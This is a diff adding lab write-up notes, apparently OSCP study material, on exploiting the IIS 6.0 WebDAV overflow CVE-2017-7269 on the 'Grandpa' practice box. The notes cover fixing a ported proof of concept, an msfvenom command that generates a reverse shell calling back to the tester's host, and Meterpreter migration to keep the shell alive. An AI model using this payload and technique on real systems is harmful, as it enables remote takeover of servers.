@@ -144,6 +144,43 @@ The reasoning sequence is: source review, calculate the field boundary, preserve
 
 #### Tags: #Covfefe #SUID #AdjacentStringOverwrite #Gets #Execve #EffectiveUID #CommandBreakdowns
 
+## Grandpa: byte-preserving IIS WebDAV adaptation
+
+Grandpa's CVE-2017-7269 PoC is a useful example of why a Python port can be syntactically correct and still be exploit-invalid. The request contains two large Unicode-encoded overflow blobs. Two blob-1 escape sequences were accidentally changed during the port:
+
+```text
+wrong:   \xe6\xbd\x43
+correct: \xe6\xbd\x83
+```
+
+Parse the escape sequences from the untouched reference and the adapted source, then compare length and every byte. After correction, both blobs were byte-perfect. `python3 -m py_compile` remains necessary but only proves syntax; it cannot catch a wrong `\\xNN` value.
+
+The payload was generated for the delivery constraints:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST="$LocalIP" LPORT="$Port" EXITFUNC=thread \
+  -e x86/alpha_mixed BufferRegister=EAX -f python
+```
+
+`BufferRegister=EAX` tells the alpha-mixed decoder where the payload is expected, and `EXITFUNC=thread` controls only the shellcode's own termination. It does not detach the socket from the IIS worker process.
+
+## Grandpa: delayed 500, missing callback, and Rapid Fail Protection
+
+The corrected reverse payload produced a delayed HTTP 500, but `tcpdump` saw no connection to the listener. A bind payload then resulted in an RST and no target-side listener. Those observations narrowed the issue to process lifetime or target-side failure, rather than treating a 500 as proof of a shell.
+
+Repeated crash attempts triggered IIS Rapid Fail Protection, after which requests reset immediately because the application pool had been disabled. This is a service-state change and a reason to stop testing, preserve the transcript, and reset or recover the target before retrying.
+
+## Grandpa: why migration is part of exploitation
+
+IIS 6.0 runs the vulnerable WebDAV code in `w3wp.exe`. A raw reverse or bind shell created by the overflow runs in a worker thread and its socket belongs to that process. When the worker crashes, the thread and socket die together. `EXITFUNC=thread` cannot make a worker-process crash survivable.
+
+The stable route used staged Meterpreter with an immediate migration action. The stage migrated into `notepad.exe` before the IIS worker terminated. This was the technical reason a framework route was necessary after the manual PoC, not a reason to skip source review.
+
+🔁 **Seen in:** [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]].
+
+#### Tags: #WindowsBOF #IIS6 #WebDAV #CVE20177269 #UnicodeOverflow #AlphaMixed #ProcessLifetime #RapidFailProtection
+
 ## **Outstanding**
 - [ ] A genuine from-scratch offset/bad-char/return-address discovery workflow (Immunity Debugger + `mona.py`, Metasploit's `pattern_create`/`pattern_offset`), once a box requires deriving these rather than reusing a public exploit's own already-researched values. See [[14. Fixing Exploits#14.3. Wrapping Up|14.3]]'s HackTricks link for where to start.
 ## External Resources
